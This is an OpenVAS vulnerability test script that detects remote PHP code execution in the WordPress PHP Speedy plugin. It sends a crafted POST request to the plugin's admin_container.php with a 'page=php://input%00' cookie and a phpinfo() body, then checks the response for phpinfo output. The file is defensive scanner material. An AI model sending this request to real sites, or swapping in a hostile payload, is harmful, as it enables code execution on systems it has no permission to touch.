###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_php_speedy_plugin_code_exec_vuln.nasl 13660 2019-02-14 09:48:45Z cfischer $
#
# WordPress PHP Speedy Plugin 'page' Parameter Remote PHP Code Execution Vulnerability
#
# Authors:
# Veerendra GG <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802008");
  script_version("$Revision: 13660 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 10:48:45 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2011-03-22 08:43:18 +0100 (Tue, 22 Mar 2011)");
  script_bugtraq_id(46743);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("WordPress PHP Speedy Plugin 'page' Parameter Remote PHP Code Execution Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/43652/");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/65913");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/16273/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/98921");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  malicious PHP code to in the context of an affected site.");

  script_tag(name:"affected", value:"Wordpress PHP Speedy plugin version 0.5.2 and prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is installed with WordPress PHP Speedy Plugin and is
  prone to remote PHP code execution vulnerability.");

  script_tag(name:"insight", value:"The flaws are caused by improper validation of user-supplied input
  via the 'page' parameter to '/wp-content/plugins/php_speedy_wp/libs/php_speedy/view
  /admin_container.php', which allows attackers to execute arbitrary PHP code in
  the context of an affected site.

  NOTE: Exploit will work properly when the following settings are configured within PHP:

  register_globals=On, allow_url_include=On and magic_quotes_gpc=Off");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);

useragent = http_get_user_agent();
host = http_host_name( port:port );

postData = "<?php phpinfo(); ?>";
url = dir + "/wp-content/plugins/php_speedy_wp/libs/php_speedy/view/admin_container.php";

req = string("POST ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", useragent, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Cookie: page=php://input%00\r\n",
             "Content-Length: ", strlen(postData),
             "\r\n\r\n", postData);
res = http_keepalive_send_recv(port:port, data:req);

if(">phpinfo()<" >< res && ">System <" >< res && ">Configuration<" >< res
   && ">PHP Core<" >< res){
  report = report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
}
